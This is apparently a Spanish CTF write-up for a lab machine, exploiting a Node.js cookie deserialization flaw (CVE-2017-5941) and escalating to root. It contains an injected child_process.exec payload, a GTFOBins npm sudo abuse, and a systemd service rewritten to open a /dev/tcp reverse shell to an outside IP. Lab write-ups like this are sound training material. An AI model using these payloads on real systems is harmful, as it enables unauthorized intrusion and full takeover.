Es Una máquina Easy de las 'complicadillas'

PORT     STATE SERVICE
8080/tcp open  http-proxy

-Entramos a la web en el puerto 8080 y vemos algo como un foro, no encontramos nada

-Aplicamos enumeración web y descubrimos el directorio /login

-Vemos como se está tramitando la petición con BurpSuite. Se está mandando una cookie en base64 con la información en formato Json. Sin embargo el servidor no está mandando nada en la ruta /login. Tenemos que mandar la petición con la cookie a la raiz / , allí si que se interpreta la cookie.

-Cookie=eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ
	Base64 Decoded: {"username":"Guest","isGuest":true,"encoding": "utf-8"}

-Está vulnerabilidad ya la explotamos en la máquina 'Jax sucks alot' de THM, se trata de:
	CVE-2017-5941

-Consiste en pasarle la cookie donde le mandamos los datos y pegamos el código del exploit para colarle un comando

-Pasamos la cookie de base64 a texto normal y tiene este aspecto:
	{"username":"ls","isGuest":true,"encoding": "utf-8"}

-Este es el código que nos proporciona el exploit para inyectar comando en el servidor:
	ND_FUNCfunction (){\n \t
	require('child_process').exec('AQUI METEMOS LA REVERSE SHELL', function(error, stdout, stderr) {
	console.log(stdout) });\n }()


www@vulnnet-node:~/VulnNet-Node$


## Escalada de Privilegios

sudo -l:
	(serv-manage) NOPASSWD: /usr/bin/npm

-Pivotamos al usuario 'serv-manage' abusando de /usr/bin/npm , el código de Gtfobins es el siguiente:
	TF=$(mktemp -d)
	echo '{"scripts": {"preinstall": "/bin/bash"}}' > $TF/package.json
	sudo npm -C $TF --unsafe-perm i
	-Para que funcione, hay que darle todos los permisos a la carpeta  $TF y los archivos de la misma, de la siguiente manera:
		chmod 777 -R  a $TF
		-Ajustamos el comando final para ejecutarlo con los permisos del usuario 'serv-manage':
			sudo -u serv-manage npm -C $TF --unsafe-perm i

serv-manage@vulnnet-node:

-sudo -l:
	(root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload

-Buscamos donde está el archivo vulnnet-auto.timer y Analizamos su contenido:
	-find / -name vulnnet-auto.timer 2>/dev/null
		 /etc/systemd/system/vulnnet-auto.timer
	-Tenemos permisos de lectura y escritura sobre los archivos 'vulnnet-auto.timer' y 'vulnnet-job.service'
	-Contenido de 'vulnnet-auto.timer': Esta ejecutando el archivo 'vulnnet-job.service' cada 30 minutos. Lo cambiamos para que lo ejecute cada minuto. Después editamos el archivo 'vulnnet-job.service' con una reverse shell:
		-Editamos 'vulnnet-auto.timer para que ejecute 'vulnnet-job.service' cada minuto:
			OnCalendar=*-*-* *:*:0
		-Editamos 'vulnnet-job.service' con una reverse shell con ruta absoluta:
			ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.9.2.165/1234 0>&1'
		-Por último, recargamos el servicio y le decimos al timer que empiece:
			-Recargamos: sudo /bin/systemctl daemon-reload
			-Empezamos el servicio: sudo /bin/systemctl start vulnnet-auto.timer
			root@vulnnet-node:/# whoami
			whoami
			root


